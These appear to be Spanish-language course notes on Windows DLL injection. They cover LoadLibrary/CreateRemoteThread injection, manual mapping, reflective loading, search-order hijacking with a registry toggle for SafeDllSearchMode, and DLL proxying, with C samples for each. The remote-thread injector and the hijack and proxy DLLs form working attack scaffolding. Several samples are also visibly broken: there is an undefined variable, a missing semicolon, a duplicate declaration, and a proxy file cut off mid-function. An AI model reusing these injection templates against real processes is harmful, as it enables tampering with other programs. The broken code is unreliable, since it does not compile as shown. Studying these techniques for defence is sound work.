
Consisten en insertar un fragmento de codigo (estructurado como una biblioteca de enlace dinamico DLL) en un proceso en ejecucion permitiendo que el codigo DLL se ejecute en contexto del proceso influyendo en su comportamiento o accediendo a sus recursos

Existen varios metodos diferentes. Esto lo suelen usar los desarrolladores para el HotPatching

## LoadLibrary

Metedo que emplea la API LoadLibrary para cargar la DLL en el espacio de direcciones del proceso objetivo

Esta API es una funcion proporcionada por el SO Windows que carga una DLL en la memoria del proceso y devuelve un handle que puede usarse para obtener las direcciones de las funciones

Ejemplo de como usar LoadLibrary para cargar una DLL en el proceso actual de forma legitima:

```
#include <windows.h> 
#include <stdio.h> 
int main() { 
	// Using LoadLibrary to load a DLL into the current process 
	HMODULE hModule = LoadLibrary("example.dll"); 
	if (hModule == NULL) { 
		printf("Failed to load example.dll\n"); 
		return -1; 
	} 
	printf("Successfully loaded example.dll\n"); 
	return 0; 
}
```

```
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```


## Mapeo manual

Metodo de inyeccion DLL muy complejo y avanzado en que se carga manualmente una DLL en la memoria de un proceso y resuelve sus importaciones y reubicaciones y evita ser detectado facilmente al no usar LoadLibrary

Esquema simplificado:

1. Cargar DLL como datos brutos en el proceso inyector
2. Mapear las secciones de la DLL en el proceso objetivo
3. Inyectar shellcode en el proceso objetivo y ejecutarlo
	1. Este `shellcode` reubica la DLL, rectifica las importaciones, ejecuta las callbacks de Almacenamiento Local de Hilo (TLS) y, finalmente, llama al `DLL main`


## Inyeccion de DLL Reflexiva

Tecnica que se usa en programacion reflexiva para cargar una biblioteca desde la memoria en un proceso anfitrion. La propia biblioteca es responsable de su proceso de carga implementando un cargador de archvios PE minimo permitiendo decidir como se cargara e interactuara con el anfitrion

Primero la biblioteca que se quiere inyectar se debe escribir en el espacio de direcciones del proceso objetivo. Segundo, la biblioteca debe cargarse en el proceso anfitrion para cumplir con las expectativas de tiempo de ejecucion

Suponiendo que tenemos ejecucion de codigo en el proceso anfitrion y que la biblioteca que pretendemos inyectar ha sido escrita en una ubicacion de memoria arbitraria en el proceso anfitrion la Inyeccion DLL Reflexiva funcionaria asi:

1. El control de ejecucion se transfiere a la funcion `ReflectiveLoader` de la biblioteca (se encuentra en la tabla de exportacion de la biblioteca) y puede ocurrir a traves de CreateRemoteThread() o de un shellcode
2. Como la imagen de la biblioteca reside actualmente en una ubicación de memoria arbitraria, el `ReflectiveLoader` calcula inicialmente la ubicación de memoria actual de su propia imagen para analizar sus propias cabeceras para su uso posterior.
3. El `ReflectiveLoader` analiza entonces la tabla de exportación del `kernel32.dll` del proceso anfitrión para calcular las direcciones de tres funciones necesarias para el cargador, a saber, `LoadLibraryA`, `GetProcAddress` y `VirtualAlloc`
4. El `ReflectiveLoader` ahora asigna una región de memoria continua donde procederá a cargar su propia imagen. La ubicación no es crucial; el cargador reubicará correctamente la imagen más tarde.
5. Las cabeceras y secciones de la biblioteca se cargan en sus nuevas ubicaciones de memoria.
6. El `ReflectiveLoader` procesa entonces la tabla de importación de la copia recién cargada de su imagen, cargando cualquier biblioteca adicional y resolviendo las direcciones de sus respectivas funciones importadas.
7. El `ReflectiveLoader` procesa entonces la tabla de reubicación de la copia recién cargada de su imagen.
8. El `ReflectiveLoader` llama entonces a la función de punto de entrada de su imagen recién cargada, `DllMain`, con `DLL_PROCESS_ATTACH`. La biblioteca ha sido cargada con éxito en la memoria.
9. Finalmente, el `ReflectiveLoader` devuelve la ejecución al `shellcode` de arranque inicial que lo llamó, o si fue llamado a través de `CreateRemoteThread`, el hilo terminaría."


## Secuestro de DLL

Tecnica de explotacion en la que un atacante se aprovecha del proceso de carga de DLL de Windows. Estas DLL se pueden cargar en tiempo de ejecucion lo que crea una opotunidad de secuestro si una aplicacion no especifica la ruta completa a la DLL requerida

Orden de busqueda de la DLL depende de si esta activado `Modo de Busqueda Segura de DLL`. Si esta activado, el modo de busqueda reposiciona el directorio actual del usuario mas abajo en el orden de busqueda

Es facil habilitar o deshabilitar este modo de busqueda:

1. Windows + R
2. Escribe `Regedit` y nos lleva al Editor de registros
3. Vamos hasta `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`
4. En el panel derecho buscamos el valor `SafeDllSearchMode`. Si no existe hacemos click derecho en espacio en blanco o en la carpeta SessionManager, seleccionamos `Nuevo` y luego `Valor de DWORD (32 bits)` y nombramos este nuevo valor como `SafeDllSearchMode`
5. Haz doble click en  `SafeDllSearchMode` y en el cmapo de informacion del valor ponemos 1 para habilitar o 0 para deshabilitar
6. Damos OK y cerramos. Reinicia el sistema para que los cambios tengan efecto

Si esta habilitado la busqueda de la DLL sera:

1. El directorio desde el que se carga la aplicación.
2. El directorio del sistema.
3. El directorio del sistema de 16 bits.
4. El directorio de Windows.
5. El directorio actual.
6. Los directorios que se enumeran en la variable de entorno PATH.

Pero con el deshabilitado sera:

1. El directorio desde el que se carga la aplicación.
2. El directorio actual.
3. El directorio del sistema.
4. El directorio del sistema de 16 bits.
5. El directorio de Windows.
6. Los directorios que se enumeran en la variable de entorno PATH.


Para el secuestro de la DLL necesitamos primero identificar la DLL que el objetivo esta intentando encontrar. Herramientas como `Process Explorer` y `PE Explorer` facilitan la busqueda

Tras identificarla tenemos que saber que funciones modificar por lo que tendremos que hacer ingenieria inversa. Tras encontrarla construimos una DLL

Ejemplo de DLL:

```
#include <stdio.h> 
#include <stdlib.h> 
#include <stdbool.h> 
#include <windows.h> 

typedef int (*AddFunc)(int, int);
 
int readIntegerInput() { 
	int value; 
	char input[100]; 
	bool isValid = false; 
	
	while (!isValid) { 
		fgets(input, sizeof(input), stdin); 
		if (sscanf(input, "%d", &value) == 1) { 
			isValid = true; 
		} else { 
			printf("Invalid input. Please enter an integer: "); 
		} 
	} 
	return value; 
} 

int main() { 
	HMODULE hLibrary = LoadLibrary("library.dll"); 
	if (hLibrary == NULL) { 
		printf("Failed to load library.dll\n"); 
		return 1; 
	} 
	
	AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add"); 
	if (add == NULL) { 
		printf("Failed to locate the 'Add' function\n"); 
		FreeLibrary(hLibrary); 
		return 1; 
	} 
	HMODULE hLibrary = LoadLibrary("x.dll"); 
	
	printf("Enter the first number: "); 
	int a = readIntegerInput(); 
	
	printf("Enter the second number: "); 
	int b = readIntegerInput(); 
	
	int result = add(a, b); 
	printf("The sum of %d and %d is %d\n", a, b, result); 
	
	FreeLibrary(hLibrary); 
	system("pause"); 
	return 0; 
}
```


Carga una función `add` desde `library.dll` y utiliza esta función para sumar dos números. Posteriormente, imprime el resultado de la suma. Al examinar el programa en Process Monitor (procmon), podemos observar el proceso de carga de `library.dll` ubicada en el mismo directorio.

Primero, configuremos un filtro en procmon para incluir únicamente `main.exe`, que es el nombre del proceso del programa. Este filtro nos ayudará a centrarnos específicamente en las actividades relacionadas con la ejecución de `main.exe`. Es importante tener en cuenta que procmon solo captura información mientras se está ejecutando activamente. Por lo tanto, si tu registro aparece vacío, debes cerrar `main.exe` y volver a abrirlo mientras procmon está en ejecución. Esto asegurará que la información necesaria sea capturada y esté disponible para su análisis.

## Proxying

Crearemos una nueva biblioteca que cargará la función `Add` desde `library.dll`, la manipulará y luego la devolverá a `main.exe`.

1. Crear una nueva biblioteca: Crearemos una nueva biblioteca que servirá como proxy para `library.dll`. Esta biblioteca contendrá el código necesario para cargar la función `Add` desde `library.dll` y realizar la manipulación requerida.
2. Cargar la función `Add`: Dentro de la nueva biblioteca, cargaremos la función `Add` desde la `library.dll` original. Esto nos permitirá acceder a la función original.
3. Manipular la función: Una vez que la función `Add` esté cargada, podremos aplicar la manipulación o modificaciones deseadas a su resultado. En este caso, simplemente vamos a modificar el resultado de la suma, para añadir `+ 1` al resultado.
4. Devolver la función modificada: Después de completar el proceso de manipulación, devolveremos la función `Add` modificada desde la nueva biblioteca a `main.exe`. Esto asegurará que cuando `main.exe` llame a la función `Add`, ejecutará la versión modificada con los cambios previstos.

El código es el siguiente:

```
// tamper.c 
#include <stdio.h> 
#include <Windows.h> 

#ifdef _WIN32 
#define DLL_EXPORT __declspec(dllexport) 
#else #define DLL_EXPORT 
#endif 

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b) 
{ 
	// Load the original library containing the Add function 
	HMODULE originalLibrary = LoadLibraryA("library.o.dll"); 
	if (originalLibrary != NULL) 
	{ 
		// Get the address of the original Add function from the library AddFunc 
		original
		Add = (AddFunc)GetProcAddress(originalLibrary, "Add"); 
		if (originalAdd != NULL) 
		{ 
			printf("============ HIJACKED ============\n"); 
			// Call the original Add function with the provided arguments 
			int result = originalAdd(a, b); 
			// Tamper with the result by adding +1

			result += 1;

	return -1; 
}
```

Donde está buscando cargar `x.dll` desde el directorio de la aplicación. Podemos aprovechar esto y cargar nuestro propio código, con muy poco contexto de lo que está buscando en `x.dll`.

```
#include <stdio.h> 
#include <Windows.h> 

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { 
	switch (ul_reason_for_call) 
	{ 
	case DLL_PROCESS_ATTACH: 
	{ 
		printf("Hijacked... Oops...\n"); 
	} 
	break; 
	case DLL_PROCESS_DETACH: 
		break; 
	case DLL_THREAD_ATTACH: 
		break;
	 case DLL_THREAD_DETACH: 
		 break; 
	} 
	return TRUE; 
}
```

Este código define una función de punto de entrada de DLL llamada `DllMain` que es llamada automáticamente por Windows cuando la DLL se carga en un proceso. Cuando la biblioteca se carga, simplemente imprimirá `Hijacked... Oops...` en la terminal, pero teóricamente podrías hacer cualquier cosa aquí.
